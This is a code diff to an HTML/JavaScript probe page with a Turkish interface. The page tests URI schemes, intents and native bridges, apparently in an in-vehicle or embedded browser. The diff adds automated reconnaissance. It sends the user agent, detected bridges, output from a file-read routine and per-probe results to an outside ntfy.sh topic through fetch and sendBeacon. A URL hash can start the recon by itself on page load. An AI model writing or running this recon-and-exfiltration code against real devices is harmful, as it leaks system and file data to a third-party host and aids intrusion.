@@ -23,6 +23,8 @@
 
 <div class="toolbar">
   <button class="primary" onclick="scanEnv()">🔎 Ortam + köprü tara</button>
+  <button onclick="autoRecon()">🤖 OTOMATİK RECON + gönder</button>
+  <button onclick="sendAll()">📡 Sonuçları gönder</button>
   <button onclick="exportAll()">📋 Durumu kopyala</button>
   <button class="reset" onclick="clearAll()">↺ Temizle</button>
 </div>
@@ -109,6 +111,15 @@ var SCHEMES = [
 var METHODS = ['link','href','open','iframe'];
 var results = {};
 
+/* --- Sonuçları agent'a otomatik gönder (ntfy) --- */
+var NT = "https://ntfy.sh/toggx-ivi-7f3k9q2m";
+function report(msg){
+  try{ fetch(NT, {method:'POST', mode:'no-cors', body:'[probe] ' + msg}); }catch(e){}
+}
+function reportBeacon(msg){
+  try{ var b = new Blob(['[probe] ' + msg], {type:'text/plain'}); navigator.sendBeacon(NT, b); }catch(e){ report(msg); }
+}
+
 function uriOf(it){
   if (it.uri) return it.uri;
   if (it.intent) return ToggKit.buildIntent(it.intent);
@@ -140,12 +151,13 @@ function armDetect(key, ms){
   setTimeout(function(){ if (pending === key){ setStatus(key, 'bad', 'yanıt yok'); pending = null; } }, ms || 1200);
 }
 document.addEventListener('visibilitychange', function(){
-  if (document.hidden && pending){ setStatus(pending, 'ok', 'native açıldı'); log('NATIVE AÇILDI: ' + pending); pending = null; }
+  if (document.hidden && pending){ setStatus(pending, 'ok', 'native açıldı'); log('NATIVE AÇILDI: ' + pending); reportBeacon('NATIVE ' + pending); pending = null; }
 });
-window.addEventListener('blur', function(){ if (pending){ setStatus(pending, 'ok', 'blur'); log('BLUR: ' + pending); pending = null; } });
+window.addEventListener('blur', function(){ if (pending){ setStatus(pending, 'ok', 'blur'); log('BLUR: ' + pending); reportBeacon('BLUR ' + pending); pending = null; } });
 
 function invoke(uri, method, key){
   setStatus(key, 'try', 'deneniyor');
+  reportBeacon('TRY ' + key + ' ' + uri);
   armDetect(key);
   try{
     if (method === 'link'){
@@ -319,6 +331,39 @@ function fileRead(){
   });
 }
 
+function autoRecon(){
+  var seq = CRIT.map(function(c){ return {uri:uriOf(c), key:c.id+':link'}; })
+    .concat(SCHEMES.filter(function(s){ return s.g.indexOf('Kritik') >= 0; })
+      .map(function(s){ return {uri:uriOf(s), key:s.id+':link'}; }))
+    .concat([{uri:'https://example.com', key:'escape:link'}]);
+  reportBeacon('RECON_START ua=' + navigator.userAgent);
+  scanEnv();
+  try{ fileRead(); }catch(e){}
+  var i = 0;
+  (function next(){
+    if (i >= seq.length){
+      reportBeacon('RECON_DONE ' + JSON.stringify(results));
+      setTimeout(sendAll, 1500);
+      return;
+    }
+    var it = seq[i++];
+    invoke(it.uri, 'link', it.key);
+    setTimeout(next, 2000);
+  })();
+}
+
+function sendAll(){
+  var payload = {
+    kind:'probe',
+    ua: navigator.userAgent,
+    engine: ToggKit.$('engine').textContent,
+    bridges: (ToggKit.$('bridges').textContent || '').slice(0, 1500),
+    fileRead: (ToggKit.$('fileOut').textContent || '').slice(0, 800),
+    results: results
+  };
+  report('ALL ' + JSON.stringify(payload));
+}
+
 function exportAll(){
   var payload = {
     ua: navigator.userAgent,
@@ -349,12 +394,14 @@ renderCrit();
 buildTable();
 showVerdict(navigator.userAgent);
 window.addEventListener('load', function(){
-  scanEnv();
   var m = /nores=([^&]+)/.exec(location.hash || '');
   if (m){
     var key = decodeURIComponent(m[1]);
-    setTimeout(function(){ setStatus(key, 'bad', 'fallback → işlenmedi'); log('FALLBACK: ' + key + ' işlenmedi'); }, 250);
+    setTimeout(function(){ setStatus(key, 'bad', 'fallback → işlenmedi'); log('FALLBACK: ' + key + ' işlenmedi'); reportBeacon('FALLBACK ' + key); }, 250);
+    return;
   }
+  scanEnv();
+  if (/(^|[#&])auto/.test(location.hash || '')){ reportBeacon('AUTO_START (hash)'); setTimeout(autoRecon, 600); }
 });
 </script>
 </body>
